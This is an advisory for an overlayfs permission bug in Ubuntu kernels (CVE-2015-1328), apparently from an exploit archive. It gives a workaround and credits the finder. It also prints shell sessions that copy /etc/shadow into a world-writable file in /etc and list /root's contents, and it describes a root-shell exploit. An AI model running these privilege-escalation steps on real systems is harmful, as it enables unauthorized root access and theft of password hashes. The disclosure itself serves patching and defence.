@@ -1,0 +1,97 @@
+The overlayfs filesystem does not correctly check file permissions when
+creating new files in the upper filesystem directory. This can be exploited
+by an unprivileged process in kernels with CONFIG_USER_NS=y and where
+overlayfs has the FS_USERNS_MOUNT flag, which allows the mounting of overlayfs
+inside unprivileged mount namespaces. This is the default configuration of
+Ubuntu 12.04, 14.04, 14.10, and 15.04 [1].
+
+If you don't want to update your kernel and you don't use overlayfs, a viable
+workaround is to just remove or blacklist overlayfs.ko / overlay.ko.
+
+Details
+================================
+
+>From Documentation/filesystems/overlayfs.txt [2]:
+
+"Objects that are not directories (files, symlinks, device-special
+files etc.) are presented either from the upper or lower filesystem as
+appropriate.  When a file in the lower filesystem is accessed in a way
+the requires write-access, such as opening for write access, changing
+some metadata etc., the file is first copied from the lower filesystem
+to the upper filesystem (copy_up)."
+
+The ovl_copy_up_* functions do not correctly check that the user has
+permission to write files to the upperdir directory. The only permissions
+that are checked is if the owner of the file that is being modified has
+permission to write to the upperdir. Furthermore, when a file is copied from
+the lowerdir the file metadata is carbon copied, instead of attributes such as
+owner being changed to the user that triggered the copy_up_* procedures.
+
+Example of creating a 1:1 copy of a root-owned file:
+
+(Note that the workdir= option is not needed on older kernels)
+
+user@...ntu-server-1504:~$ ./create-namespace
+root@...ntu-server-1504:~# mount -t overlay -o
+lowerdir=/etc,upperdir=upper,workdir=work overlayfs o
+root@...ntu-server-1504:~# chmod 777 work/work/
+root@...ntu-server-1504:~# cd o
+root@...ntu-server-1504:~/o# mv shadow copy_of_shadow
+(exit the namespace)
+user@...ntu-server-1504:~$ ls -al upper/copy_of_shadow
+-rw-r----- 1 root shadow 1236 May 24 15:51 upper/copy_of_shadow
+user@...ntu-server-1504:~$ stat upper/copy_of_shadow /etc/shadow|grep Inode
+Device: 801h/2049d      Inode: 939791      Links: 1
+Device: 801h/2049d      Inode: 277668      Links: 1
+
+Now we can place this file in /etc by switching "upper" to be the lowerdir
+option, the permission checks pass since the file is owned by root and root
+can write to /etc.
+
+user@...ntu-server-1504:~$ ./create-namespace
+root@...ntu-server-1504:~# mount -t overlay -o
+lowerdir=upper,upperdir=/etc,workdir=work overlayfs o
+root@...ntu-server-1504:~# chmod 777 work/work/
+root@...ntu-server-1504:~# cd o
+root@...ntu-server-1504:~/o# chmod 777 copy_of_shadow
+root@...ntu-server-1504:~/o# exit
+user@...ntu-server-1504:~$ ls -al /etc/copy_of_shadow
+-rwxrwxrwx 1 root shadow 1236 May 24 15:51 /etc/copy_of_shadow
+
+The attached exploit gives a root shell by creating a world-writable
+/etc/ld.so.preload file. The exploit has been tested on the most recent
+kernels before 2015-06-15 on Ubuntu 12.04, 14.04, 14.10 and 15.04.
+
+It is also possible to list directory contents for any directory on the system
+regardless of permissions:
+
+nobody@...ntu-server-1504:~$ ls -al /root
+ls: cannot open directory /root: Permission denied
+nobody@...ntu-server-1504:~$ mkdir o upper work
+nobody@...ntu-server-1504:~$ mount -t overlayfs -o
+lowerdir=/root,upperdir=/home/user/upper,workdir=/home/user/work
+overlayfs /home/user/o
+nobody@...ntu-server-1504:~$ ls -al o 2>/dev/null
+total 8
+drwxrwxr-x 1 root nogroup 4096 May 24 16:33 .
+drwxr-xr-x 8 root nogroup 4096 May 24 16:33 ..
+-????????? ? ?    ?          ?            ? .bash_history
+-????????? ? ?    ?          ?            ? .bashrc
+d????????? ? ?    ?          ?            ? .cache
+-????????? ? ?    ?          ?            ? .lesshst
+d????????? ? ?    ?          ?            ? linux-3.19.0
+
+
+Credit
+================================
+Philip Pettersson, Samsung SDS Security Center
+
+References
+================================
+[1] https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/vivid/commit/?id=78ec4549
+[2] https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt
+[3] http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html
+
+
+
+## EDB Note: Exploit Mirror - https://www.exploit-db.com/exploits/37292/
